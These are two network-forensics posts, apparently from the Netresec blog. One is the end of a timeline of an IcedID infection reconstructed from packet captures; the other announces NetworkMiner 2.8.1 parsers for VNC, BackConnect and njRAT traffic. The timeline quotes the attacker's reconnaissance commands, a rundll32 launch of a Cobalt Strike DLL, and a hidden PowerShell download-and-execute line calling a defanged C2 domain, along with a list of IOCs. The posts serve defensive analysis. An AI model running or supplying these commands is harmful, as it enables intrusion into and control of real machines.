              <img src="https://www.netresec.com/images/NetworkMiner_Images_VNC-screenshots_137-74-104-108_473x438.png" width="473" height="438" alt="VNC desktop screenshots extracted by NetworkMiner" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: BackConnect VNC screenshots</i>
              <br />
              <a href="https://www.netresec.com/images/VNC_CC199DDA_221031150112.jpg">
                <img src="https://www.netresec.com/images/VNC_CC199DDA_221031150112_520x495.jpg" title="Click to show full screenshot" alt="Screenshot of attacker’s view of victim screen (Keyhole VNC)" width="520" height="495" style="clear: both; margin-top: 20px;" />
              </a>
              <br />
              <i style="clear: both;">Image: Screenshot of attacker’s view of victim screen (Keyhole VNC)</i>
              <p>
                <b>15:06 Apple Store</b>
              </p>
              <img src="https://www.netresec.com/images/NetworkMiner_Parameters_IcedID-BackConnect_keylog-apple-store_519x609.png" alt="Attacker’s keystrokes extracted from BackConnect VNC traffic" width="519" height="609" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: Attacker’s keystrokes extracted from BackConnect VNC traffic</i>
              <p>
        The keylog of the attacker above reveals that the attacker is typing “iphone 14 apple store buy”. The VNC graphics that NetworkMiner extracted from the PCAP file additionally reveal that this was a Google search query typed into an Edge browser.
      </p>
              <a href="https://www.netresec.com/images/VNC_CC199DDA_221031150658.jpg">
                <img src="https://www.netresec.com/images/VNC_CC199DDA_221031150658_459x347.jpg" title="Click to show full screenshot" alt="Google search results from reverse VNC session" width="459" height="347" style="clear: both;" />
              </a>
              <br />
              <i style="clear: both;">Image: Google search results from reverse VNC session</i>
              <p>
                <b>15:10 Credit Card payment</b>
              </p>
              <p>
        The attacker proceeds to the Apple Store, puts a black iPhone 14 Plus for $987.99 into the shopping cart, enters a delivery address in West Hartford (US) and then inputs credit card details for the payment.
      </p>
              <a href="https://www.netresec.com/images/VNC_CC199DDA_221031151015_censored_1920x1152.jpg">
                <img src="https://www.netresec.com/images/VNC_CC199DDA_221031151015_censored_520x574.png" title="Click to show full screenshot" alt="Credit card details entered in Apple Store by attacker" width="520" height="574" style="clear: both;" />
              </a>
              <br />
              <i style="clear: both;">Image: Credit card details entered in Apple Store by attacker</i>
              <p>
        Luckily, the transaction was denied by Apple Store.
      </p>
              <a href="https://www.netresec.com/images/VNC_CC199DDA_221031151121.jpg">
                <img src="https://www.netresec.com/images/VNC_CC199DDA_221031151121_520x97.jpg" title="Click to show full screenshot" alt="Error message from Apple Store: Your payment authorization failed" width="520" height="97" style="clear: both;" />
              </a>
              <br />
              <i style="clear: both;">Image: Payment authorization failed</i>
              <p>
                <b>15:12 Reverse Shell</b>
              </p>
              <p>
        After having failed to buy an iPhone through the hacked computer the attacker instead deploys three reverse shell sessions using the BackConnect C2 channel.    
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_Parameters_IcedID-BackConnect-deploy-reverse-shell_519x339.png" alt="Frame 143574 on 15:12:30, Frame 144299 on 15:38:22, Frame 147667 on 15:49:32" width="519" height="339" style="clear: both;" />
              <p>
        These three commands are issued in the first reverse shell session:
      </p>
              <div style="clear: left; font-family: Consolas, 'Lucida Console', Monaco, 'Courier New'; background-color: #111111; color: #ffffff; border: 1px solid #999999; padding: 6px; margin: 4px; word-break: break-all;" x-ms-format-detection="none">
        net group "domain admins" /dom<br />
        arp -a<br />
        dir \\172.16.0.12\c$
      </div>
              <p>
        In the second shell session the attacker first runs these three commands:
      </p>
              <div style="clear: left; font-family: Consolas, 'Lucida Console', Monaco, 'Courier New'; background-color: #111111; color: #ffffff; border: 1px solid #999999; padding: 6px; margin: 4px; word-break: break-all;" x-ms-format-detection="none">
        shell net group "domain admins" /dom<br />
        net group "domain admins" /dom<br />
        nltest /domain_trusts /all_trusts
      </div>
              <p>
        ...and then starts a file manager session through the BackConnect C2 channel.
      </p>
              <p>
                <b>15:40 Deploy Cobalt Strike</b>
              </p>
              <p>
        The BackConnect file manager is used to upload a <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike">Cobalt Strike</a> binary called P2.dll to "C:\ProgramData\" on the victim computer in frame 144535.
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_Parameters_IcedID-BackConnect-PUT-and-rundll_CobaltStrike_519x752.png" alt="NetworkMiner 2.8.1 showing CobaltStrike delivered to victim through BackConnect's File Manager" width="519" height="752" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: CobaltStrike delivered to victim through BackConnect's File Manager</i>
              <p>
        The uploaded P2.dll is then executed by running this command in the reverse shell session (frame 144707):
      </p>
              <div style="clear: left; font-family: Consolas, 'Lucida Console', Monaco, 'Courier New'; background-color: #111111; color: #ffffff; border: 1px solid #999999; padding: 6px; margin: 4px; word-break: break-all;" x-ms-format-detection="none">
        rundll32 c:\programdata\P2.dll,DllRegisterServer
      </div>
              <p>
        NetworkMiner extracts this uploaded DLL from the BackConnect network traffic.
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_Files_CobaltStrike_P2-dll_520x339.png" alt="Files extracted by NetworkMiner from network traffic, including Cobalt Strike P2.dll" width="520" height="339" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: Files extracted from network traffic</i>
              <img src="https://www.netresec.com/images/FileDetails_CobaltStrike_P2-dll_cc69a31a067b62dda5f2076f8ee335e1_506x375.png" alt="Details for Cobalt Strike P2.dll with MD5 hash cc69a31a067b62dda5f2076f8ee335e1" width="506" height="375" style="clear: both; margin-top: 20px;" />
              <br />
              <i style="clear: both;">Image: Details for Cobalt Strike P2.dll</i>
              <p>
                <img src="https://www.netresec.com/images/VirusTotal_cc69a31a067b62dda5f2076f8ee335e1_200x183.png" alt="VirusTotal results 46 of 71 for P2.dll cc69a31a067b62dda5f2076f8ee335e1" width="200" height="183" style="float: right;" />
        As you can see in the screenshot above, the MD5 hash of P2.dll is <span style="word-break: break-all">cc69a31a067b62dda5f2076f8ee335e1</span>. This file is flagged as malicious by most AV vendors (<a href="https://www.virustotal.com/gui/file/c528e31aad8e88e0997d48c74b58014a02848dd897c5b17e8c806163992acd30/summary">P2.dll on VT</a>).
        However, none of them label it as Cobalt Strike. Luckily I was able to use Triage's malware config extractor to verify that this was indeed Cobalt Strike (<a href="https://tria.ge/231011-p9zfsaha6s">P2.dll on tria.ge</a>). Triage also revealed that the CobaltStrike C2 URL was
        <br /><span style="word-break: break-all">clouditsoft[.]com:8008/static-directory/mg.jpg</span></p>
              <p>
        After the DLL gets executed the victim PC establishes Cobalt Strike beacon C2 connections to clouditsoft[.]com on port 8008 (frame 144715).
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_Sessions_CobaltStrike-clouditsoft_519x466.png" alt="Cobalt Strike beacon sessions" width="519" height="466" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: Cobalt Strike beacon sessions</i>
              <p>
                <b>15:41 MOAR COBALT STRIKE</b>
              </p>
              <p>
        The BackConnect Reverse Shell log in NetworkMiner's Parameters tab shows that the attacker also attempted to download Cobalt Strike using PowerShell at 15:41:59 UTC (frame 145176) with this command:
      </p>
              <div style="clear: left; font-family: Consolas, 'Lucida Console', Monaco, 'Courier New'; background-color: #111111; color: #ffffff; border: 1px solid #999999; padding: 6px; margin: 4px; word-break: break-all;" x-ms-format-detection="none">
        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://clouditsoft[.]com:8008/lass'))"
      </div>
              <p>
                <b>IOC List</b>
              </p>
              <p>
                <ul>
                  <li>IP:port 67.205.184.237:80 (GzipLoader)</li>
                  <li>DNS vgiragdoffy[.]com (GzipLoader)</li>
                  <li>MD5 700c602086590b05dde8df57933c7e68 (Fake gzip file)</li>
                  <li>MD5 f57ab2e5e5720572d5eb19010ec8dcb4 (IcedID Odwikp.dll from fake gzip)</li>
                  <li>MD5 57a9d9acb389bd74a7423a16ef81ac18 (IcedID license.dat from fake gzip)</li>
                  <li>DNS ringashopsu[.]com (IcedID C2)</li>
                  <li>DNS sainforgromset[.]com (IcedID C2)</li>
                  <li>DNS yeloypod[.]hair (IcedID C2)</li>
                  <li>DNS airsaintol[.]beauty (IcedID C2)</li>
                  <li>IP:port 137.184.208.116:443 (IcedID C2)</li>
                  <li>IP:port 138.68.255.102:443(IcedID C2)</li>
                  <li>IP:port 94.140.114.103:443 (IcedID C2)</li>
                  <li>IP:port 66.63.168.7:443 (IcedID C2)</li>
                  <li>JA3S hash ec74a5c51106f0419184d0dd08fb05bc (IcedID C2)</li>
                  <li>IP:port 137.74.104.108:8080 (IcedID BackConnect C2)</li>
                  <li>MD5 cc69a31a067b62dda5f2076f8ee335e1 (CobaltStrike P2.dll)</li>
                  <li>DNS clouditsoft[.]com (CobaltStrike C2)</li>
                  <li>IP:port 198.44.140.67:8008 (CobaltStrike C2)</li>
                </ul>
              </p>
              <p class="shadyText">
          Posted by Erik Hjelmvik on Thursday, 12 October 2023 13:23:00 (UTC/GMT)</p>
              <p>
          Tags: <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=NetworkMiner">NetworkMiner</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=IcedID">IcedID</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=GzipLoader">GzipLoader</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=BackConnect">BackConnect</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=VNC">VNC</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=CobaltStrike">CobaltStrike</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=Cobalt Strike">Cobalt Strike</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=Windows Sandbox">Windows Sandbox</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=ec74a5c51106f0419184d0dd08fb05bc">ec74a5c51106f0419184d0dd08fb05bc</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=JA3S">JA3S</a></span>​
  </p>
            </article>
            <p>
        Share: 
        <a rel="nofollow" title="Share on Facebook" href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-10%26post%3dForensic-Timeline-of-an-IcedID-Infection"><img src="/images/share/facebook.gif" alt="Facebook" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Share on Twitter" href="https://twitter.com/intent/tweet?text=Forensic%20Timeline%20of%20an%20IcedID%20Infection&amp;url=https%3a%2f%2fnetresec.com%2f%3fb=23A4de6&amp;via=netresec"><img src="/images/share/twitter_16.png" alt="Twitter" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Submit to reddit" href="https://www.reddit.com/r/netsec/submit?url=https%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-10%26post%3dForensic-Timeline-of-an-IcedID-Infection"><img src="/images/share/reddit.gif" alt="Reddit" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Submit to Hacker News on Y Combinator" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-10%26post%3dForensic-Timeline-of-an-IcedID-Infection&amp;t=Forensic%20Timeline%20of%20an%20IcedID%20Infection"><img src="/images/share/ycombinator_16x16.png" alt="Hacker News" style="vertical-align: top; border-style: none;" width="16" height="16" /></a><span style="float: right;">
          Short URL: 
          <a href="https://netresec.com/?b=23A4de6">
            https://netresec.com/?b=23A4de6</a></span></p>
          </div>
          <div class="blogPost">
            <article>
              <div class="byline-name" style="float:left;">Erik Hjelmvik</div>
              <div style="float:left;">, </div>
              <div class="dateline" style="float:left;">Monday, 02 October 2023 11:13:00 (UTC/GMT)</div>
              <br />
              <h2>
                <a class="blogPostTitle" href="/?page=Blog&amp;month=2023-10&amp;post=NetworkMiner-2-8-1-Released">NetworkMiner 2.8.1 Released</a>
              </h2>
              <p>
        I am happy to announce the release of <a href="https://www.netresec.com/?page=NetworkMiner">NetworkMiner</a> 2.8.1 today!
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_2-8-1_200x200.png" alt="NetworkMiner 2.8.1" width="200" height="200" style="float: right;" />
              <p>
        This new release brings a VNC parser to NetworkMiner, so that screenshots, keystrokes and clipboard data can be extracted from unencrypted VNC traffic. NetworkMiner 2.8.1 additionally includes parsers for command-and-control (C2) protocols used by njRAT, IcedID, QakBot and Bazar. We have also added extraction of files sent using a HTTP PUT request, which is the rare cousin to the more common POST request. NetworkMiner’s Images tab has also been updated to enable filtering based on filename or pixel count.
      </p>
              <p>
                <b>VNC</b>
              </p>
              <p>
        NetworkMiner now supports the remote framebuffer (RFB) protocol (<a href="https://datatracker.ietf.org/doc/html/rfc6143">RFC 6143</a>), which is the underlying protocol used in VNC software. VNC is used to remotely control another computer with help of a real-time video feed of the remote computer’s screen and the ability to control the remote desktop using a mouse and keyboard.
      </p>
              <p>
        NetworkMiner reassembles the desktop graphics that get transferred between a VNC client and server to build a local representation of the remote desktop. Screenshots of that desktop then get extracted to disk by NetworkMiner as it gets updated. These desktop screenshots can be viewed in NetworkMiner’s Images tab. NetworkMiner also extracts keystrokes and clipboard data from the VNC traffic and displays them in the Parameters tab.
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_2-8-1_Parameters_VNC_520x722.png" alt="VNC keylog in NetworkMiner" width="520" height="722" style="clear: both;" />
              <br />
              <i style="clear: both;">
        Image: Keystrokes “D#L#T#thispass#” extracted from 06-vnc-Password-3.3.pcap, which is available in “vnc-pcaps.zip” from the <a href="https://openwall.info/wiki/john/sample-non-hashes#VNC"> Openwall Wiki</a></i>
              <p>
                <b>Limitations in VNC Extraction</b>
              </p>
              <p>
        Essential configuration of the VNC session is set up in the beginning of each TCP session. NetworkMiner therefore requires analyzed traffic to include this initial setup in order to successfully extract graphics from a VNC session.
      </p>
              <p>
        Only traffic to TCP ports 5900 and 5901 will be parsed as VNC traffic by the free version of NetworkMiner. Our commercial tool <a href="https://www.netresec.com/?page=BuyNetworkMiner">NetworkMiner Professional</a> has the ability to identify VNC traffic regardless of port number, but the free version will fail to extract screenshots from VNC traffic running on non-standard ports.
      </p>
              <p>
        NetworkMiner’s VNC implementation is currently at an early stage, which is why it might fail to extract screenshots or other data from VNC sessions. If you encounter VNC traffic that NetworkMiner fails to parse, then we’d be very grateful if you would <a href="https://www.netresec.com/?page=AboutNetresec">contact us</a> and let us know so that we can improve NetworkMiner’s VNC extraction in future releases.
      </p>
              <p>
                <b>BackConnect</b>
              </p>
              <p>
        I have previously outlined the <a href="https://netresec.com/?b=22A38f9">BackConnect protocol</a> used by IcedID, QakBot as well as Bazar.
        This BackConnect protocol is used by botnet operators to remotely control a victim computer using a form of remote access trojan (RAT). This BackConnect protocol supports features such as tunneling network traffic through the victim’s computer, uploading files and the ability to control the victim’s computer using VNC.
      </p>
              <p>
        NetworkMiner now has a parser for this BackConnect protocol, which allows analysts to see screenshots, keystrokes and file uploads from when the attacker interacts with the hacked computer. As you might have guessed, NetworkMiner’s VNC parser is reused in order to also parse reverse VNC traffic from BackConnect sessions.
      </p>
              <p>
        I would like to thank <a href="https://infosec.exchange/@0xThiebaut">Maxime Thiebaut</a> for releasing his <a href="https://github.com/0xThiebaut/PCAPeek/">PCAPeek</a> tool, which also reassembles reverse VNC traffic from BackConnect traffic. Maxime’s tool proved that it was possible to extract graphics from this C2 traffic, which motivated me to create a BackConnect VNC parser for NetworkMiner.
      </p>
              <p>
                <b>BackConnect VNC Replay</b>
              </p>
              <p>
        To demonstrate NetworkMiner’s reverse VNC reassembly I’d like to use the file “2023-07-26-IcedID-with-Keyhole-VNC-traffic.pcap” from Brad Duncan’s fantastic <a href="https://malware-traffic-analysis.net/2023/07/25/index.html">malware-traffic-analysis.net website</a>. In this traffic the IcedID BackConnect C2 server listens to TCP port 443 on 165.232.175.216.
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_2-8-1_Images_BackConnect_VNC_Amazon_520x594.png" alt="VNC screenshots extracted with NetworkMiner" width="520" height="594" style="clear: both;" />
              <br />
              <i style="clear: both;">
        Image: NetworkMiner showing thumbnails of extracted screenshots
      </i>
              <p>
        The screenshot thumbnails from the BackConnect VNC traffic shows that the attacker opens up the Amazon website on the victim’s computer. A copy of the full 1920x1152 screenshot, which NetworkMiner extracted from the VNC traffic, can be viewed here:
        <a href="https://www.netresec.com/images/VNC_73F81C83_230726142247.jpg">VNC_73F81C83_230726142247.jpg</a></p>
              <p>
        The parameters tab in NetworkMiner additionally confirms that the attacker manually typed “amazon.com” into the hacked computer’s web browser.
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_2-8-1_Parameters_BackConnect_VNC_Amazon_520x411.png" alt="Keylog of attacker typing amazon.com" width="520" height="411" style="clear: both;" />
              <br />
              <i style="clear: both;">Image: Keylog of attacker typing amazon.com</i>
              <p>
                <b>Limitations in BackConnect Parser</b>
              </p>
              <p>
        The BackConnect implementation in NetworkMiner 2.8.1 is pretty well tested and even supports the new “encrypted” version of BackConnect that IcedID has been deploying lately (we call it “BackConnect XOR”). NetworkMiner can parse the BackConnect C2 traffic as well as the traffic from modules for reverse VNC, reverse SOCKS, reverse shell and the file manager.
      </p>
              <p>
        Unfortunately the BackConnect traffic typically runs on TCP ports like 443 or 8080, which are normally used for TLS or web proxies. The free open source version of NetworkMiner normally attempts to interpret traffic to port 443 as TLS and 8080 as HTTP proxy, even though it might be BackConnect. A hardcoded list of 32 verified BackConnect C2 servers, such as
        <a href="https://threatfox.abuse.ch/ioc/1139214/">165.232.175.216:443</a>,
        <a href="https://threatfox.abuse.ch/ioc/1138213/">137.184.172.23:443</a> and
        <a href="https://threatfox.abuse.ch/ioc/1099335/">185.99.132.16:8080</a>, has therefore been added to NetworkMiner’s <a href="https://www.netresec.com/?page=NetworkMinerSourceCode">source code</a>. This enables NetworkMiner to interpret traffic to those IP:port combinations as BackConnect. Our commercial tool <a href="https://www.netresec.com/?page=BuyNetworkMiner">NetworkMiner Professional</a> can identify protocols without relying on the port number though, this enables the “Pro” version to also parse BackConnect traffic to C2 servers that aren’t among the 32 hard coded ones in the source code.
      </p>
              <p>
                <b>njRAT</b>
              </p>
              <p>
        njRAT is an old, yet still very popular remote access trojan (RAT). It has been around for at least 10 years (since 2013) and can be used to do things like:
        <ul><li>Steal credentials</li><li>Take screenshots of the desktop</li><li>Start the camera</li><li>Record audio with the microphone</li><li>Start a reverse shell</li><li>Upload or download files</li><li>Execute a file or module</li><li>Capture keystrokes with a keylogger</li><li>Create, read or delete registry keys</li><li>Run a command</li></ul></p>
              <p>

        I have been teaching students in <a href="https://www.netresec.com/?page=Training">my network forensics classes</a> how to manually parse njRAT traffic since 2015, but from now on I’ll instead be able to tell them to load the njRAT traffic into NetworkMiner to see what the attacker did on the victim’s computer.
      </p>
              <img src="https://www.netresec.com/images/NetworkMiner_2-8-1_Parameters_njRAT_520x462.png" alt="Victim info extracted from njRAT PCAP with NetworkMiner" width="520" height="462" style="clear: both;" />
              <br />
              <i style="clear: both;">
        Image: Information extracted from njRAT C2 traffic by NetworkMiner
      </i>
              <br />
              <img src="https://www.netresec.com/images/njRAT-scPK_510x490.jpg" alt="Screenshot of infected computer extracted from njRAT C2 traffic" width="510" height="490" style="clear: both; margin-top: 20px;" />
              <br />
              <i style="clear: both;">Image: Screenshot of infected computer extracted from njRAT C2 traffic</i>
              <p>
        The NetworkMiner parameters and victim PC screenshot above were extracted from 2015-04-22_capture-win4.pcap in StratosphereIPS’ dataset <a href="https://mcfp.felk.cvut.cz/publicDatasets/CTU-Malware-Capture-Botnet-120-1/">CTU-Malware-Capture-Botnet-120-1</a>. The victim PC desktop screenshot actually came out as a 51x4900 pixel image in NetworkMiner 2.8.1, so I had to manually reorganize the tiles to a 510x490 image instead. I’m planning to add an automatic retiling feature to NetworkMiner to avoid having to do this manually in the future.
      </p>
              <p>
                <b>Limitations in njRAT Parser</b>
              </p>
              <p>
        njRAT comes in many different versions, forks and flavors and the protocol even has a field delimiter sequence that can be customized for each njRAT backdoor. I can therefore not guarantee that NetworkMiner will be able to parse traffic from all njRAT sessions, but so far I’ve seen very good results – even when custom field delimiters are being used.
      </p>
              <p>
        Nevertheless, this trojan has an abundance of features but only the most commonly used ones are implemented in NetworkMiner. More specifically NetworkMiner primarily supports extraction of screenshots, credentials, keylog data, file uploads and downloads. NetworkMiner also extracts exfiltrated metadata about the victim machine and bot, such as the hostname, operating system, logged in user, bot ID, botnet, njRAT version and njRAT install date.
      </p>
              <p>
        Also, as previously mentioned, NetworkMiner doesn’t yet stitch together tiles of desktop screenshots correctly.
      </p>
              <p>
        Another limitation is that an njRAT C2 server can be deployed on any TCP port, which might prevent the free version from interpreting the C2 traffic as njRAT. The free version of NetworkMiner currently tries to parse traffic to ports like 1177, 5050, 5552 and a few others as njRAT, while <a href="https://www.netresec.com/?page=BuyNetworkMiner">NetworkMiner Professional</a> will automatically recognize the njRAT protocol regardless which port it runs on.
      </p>
              <p>
                <b>Bug Fixes</b>
              </p>
              <p>
        We’ve added support for SIP keepalive messages (RFC 5626) in NetworkMiner 2.8.1. NetworkMiner Professional would previously fail to extract VoIP calls, or text messages sent through SIP, if a keepalive packet was sent in the session prior to the call or text message.
        We have also fixed a bug in NetworkMiner’s <a href="https://en.wikipedia.org/wiki/CAPWAP">CapWap</a> parser.
      </p>
              <p>
                <b>Upgrading to Version 2.8.1</b>
              </p>
              <p>
        Users who have purchased NetworkMiner Professional can download a free update to version 2.8.1 from our <a href="https://www.netresec.com/portal/">customer portal</a>, or use the “Check for Updates” feature from NetworkMiner's Help menu. Those who instead prefer to use the free and open source version can grab the latest version of NetworkMiner from the <a href="https://www.netresec.com/?page=NetworkMiner">official NetworkMiner page</a>.
      </p>
              <p class="shadyText">
          Posted by Erik Hjelmvik on Monday, 02 October 2023 11:13:00 (UTC/GMT)</p>
              <p>
          Tags: <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=NetworkMiner">NetworkMiner</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=VNC">VNC</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=BackConnect">BackConnect</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=IcedID">IcedID</a></span>​
  <span style="margin: 4px; display: inline-block;">#<a href="/?page=Blog&amp;tag=njRAT">njRAT</a></span>​
  </p>
            </article>
            <p>
        Share: 
        <a rel="nofollow" title="Share on Facebook" href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-10%26post%3dNetworkMiner-2-8-1-Released"><img src="/images/share/facebook.gif" alt="Facebook" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Share on Twitter" href="https://twitter.com/intent/tweet?text=NetworkMiner%202.8.1%20Released&amp;url=https%3a%2f%2fnetresec.com%2f%3fb=23A41e6&amp;via=netresec"><img src="/images/share/twitter_16.png" alt="Twitter" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Submit to reddit" href="https://www.reddit.com/r/netsec/submit?url=https%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-10%26post%3dNetworkMiner-2-8-1-Released"><img src="/images/share/reddit.gif" alt="Reddit" style="vertical-align: top; border-style: none;" width="16" height="16" /></a>
         
        <a rel="nofollow" title="Submit to Hacker News on Y Combinator" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2fwww.netresec.com%2f%3fpage%3dBlog%26month%3d2023-10%26post%3dNetworkMiner-2-8-1-Released&amp;t=NetworkMiner%202.8.1%20Released"><img src="/images/share/ycombinator_16x16.png" alt="Hacker News" style="vertical-align: top; border-style: none;" width="16" height="16" /></a><span style="float: right;">
          Short URL: 
          <a href="https://netresec.com/?b=23A41e6">
            https://netresec.com/?b=23A41e6</a></span></p>
          </div>
        </div>
        <div class="sidepane">
          <h3>Recent Posts</h3>
          <p>
      » <a href="/?page=Blog&amp;month=2023-12&amp;post=Network-Forensics-Training---Spring-2024">Network Forensics Training - Spring 2024</a></p>
          <p>
      » <a href="/?page=Blog&amp;month=2023-11&amp;post=CapLoader-1-9-6-Released">CapLoader 1.9.6 Released</a></p>
          <p>
      » <a href="/?page=Blog&amp;month=2023-10&amp;post=Forensic-Timeline-of-an-IcedID-Infection">Forensic Timeline of an IcedID Infection</a></p>
          <p>
      » <a href="/?page=Blog&amp;month=2023-10&amp;post=NetworkMiner-2-8-1-Released">NetworkMiner 2.8.1 Released</a></p>
          <h3>Blog Archive</h3>
          <p>
        » <a href="?page=Blog&amp;year=2023">2023 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2022">2022 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2021">2021 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2020">2020 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2019">2019 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2018">2018 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2017">2017 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2016">2016 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2015">2015 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2014">2014 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2013">2013 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2012">2012 Blog Posts
      </a></p>
          <p>
        » <a href="?page=Blog&amp;year=2011">2011 Blog Posts
      </a></p>
          <p>
            <a href="/?page=Blog&amp;blogPostList=true">List all blog posts</a>
          </p>
          <h3>News Feeds</h3>
          <p>
          » <a href="https://news.google.com/publications/CAAqBwgKMIKCogswxYy6Aw">Google News</a></p>
          <p>
			» <a href="https://feeds.feedburner.com/Netresec-Network-Security-Blog">FeedBurner</a></p>
          <p>
			» <a href="https://www.netresec.com/rss.ashx">RSS Feed</a></p>
        </div>
        <div class="sidepane2">
          <img src="/images/X_100x90.png" width="100" height="90" alt="X / twitter" />
          <p>
      NETRESEC on X / Twitter:
      <a rel="me" href="https://twitter.com/netresec">@netresec</a></p>
          <img src="/images/mastodon_100x107.png" width="100" height="107" alt="Mastodon" />
          <p>
			NETRESEC on Mastodon:
			<a rel="me" href="https://infosec.exchange/@netresec" style="word-break: break-all;">@netresec@infosec.exchange</a></p>
        </div>
      </div>
      <div id="pageFooter">
        <span>𝙽𝙴𝚃𝚁𝙴𝚂𝙴𝙲</span> |
          <span><a href="/?page=AboutNetresec">Contact Us</a></span>
          |
          <span><a href="/?page=Privacy">Privacy</a></span>
          |
          <span><a rel="me" href="https://twitter.com/netresec">X</a></span>
			|
			<span><a rel="me" href="https://infosec.exchange/@netresec">Mastodon</a></span>
			|
			<span><a href="https://www.netresec.com/rss.ashx">RSS</a></span>
          |
          <span><a href="https://news.google.com/publications/CAAqBwgKMIKCogswxYy6Aw">News Feed</a></span></div>
    </div>
  </body>
</html>